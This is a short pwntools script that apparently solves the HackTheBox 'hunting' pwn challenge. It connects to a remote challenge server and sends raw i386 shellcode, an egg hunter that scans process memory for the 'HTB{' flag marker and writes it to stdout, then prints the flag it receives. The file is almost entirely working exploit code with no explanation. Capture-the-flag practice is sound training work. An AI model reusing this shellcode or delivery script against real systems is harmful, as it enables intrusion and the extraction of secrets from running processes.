from pwn import *

level = "hunting"
ip = "46.101.80.226:30024"
os.chdir("/home/ayush/Work/HackTheBox/Challenges/PWN/"+level)
print(os.getcwd())

context.update(arch="i386", os="linux")

#binary = ELF("./hunting")
payload = b"\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80"


#r = binary.process()
r = remote(ip.split(':')[0], ip.split(':')[1])
log.info("Sending payload...")
r.send(payload)

flag = r.recv()
log.success("FLAG: " + str(flag))
r.close()